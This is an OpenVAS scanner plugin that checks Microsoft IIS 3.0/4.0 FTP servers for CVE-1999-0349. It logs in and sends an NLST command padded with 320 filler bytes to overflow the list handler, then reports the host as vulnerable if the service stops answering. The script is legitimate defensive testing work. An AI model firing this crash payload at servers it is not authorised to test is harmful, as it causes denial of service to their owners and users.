###############################################################################
# OpenVAS Vulnerability Test
#
# Microsoft IIS FTP Server 'Malformed FTP List Request' DOS Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:microsoft:ftp_service";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802440");
  script_version("2019-05-03T08:55:39+0000");
  script_cve_id("CVE-1999-0349");
  script_bugtraq_id(192);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2019-05-03 08:55:39 +0000 (Fri, 03 May 2019)");
  script_tag(name:"creation_date", value:"2012-07-04 16:21:03 +0530 (Wed, 04 Jul 2012)");
  script_name("Microsoft IIS FTP Server 'Malformed FTP List Request' DOS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("secpod_ms_iis_ftpd_detect.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("MS/IIS-FTP/Installed");

  script_xref(name:"URL", value:"http://en.securitylab.ru/nvd/246545.php");
  script_xref(name:"URL", value:"http://technet.microsoft.com/en-us/security/bulletin/ms99-003");

  script_tag(name:"impact", value:"Successful exploitation will allows remote users to crash the application
  leading to denial of service condition or execute arbitrary code.");

  script_tag(name:"affected", value:"Microsoft Internet Information Services version 3.0 and 4.0.");

  script_tag(name:"insight", value:"The FTP service in IIS has an unchecked buffer in a component that processes
  'list' commands. A constructed 'list' request could cause arbitrary code to
  execute on the server via a classic buffer overrun technique.");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the references for more information.");

  script_tag(name:"summary", value:"This host is missing important security update according to
  Microsoft Bulletin MS99-033.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

if(!ftpPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!ftpLoc = get_app_location(port:ftpPort, cpe:CPE)){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
pass = kb_creds["pass"];

ftplogin = ftp_log_in(socket:soc, user:login, pass:pass);
if(!ftplogin){
  close(soc);
  exit(0);
}

port2 = ftp_pasv(socket:soc);
if(!port2){
  exit(0);
}

soc2 = open_sock_tcp(port2, transport:get_port_transport(ftpPort));

command = strcat('NLST ', crap(320), '\r\n');
send(socket:soc, data:command);

close(soc2);
close(soc);

sleep(7);

soc3 = open_sock_tcp(ftpPort);
if(soc3){
  recv = ftp_recv_line(socket:soc3);
  if(!recv){
    security_message(port:ftpPort);
    exit(0);
  }
  close(soc3);
  exit(99);
}else{
  security_message(port:ftpPort);
  exit(0);
}

exit(99);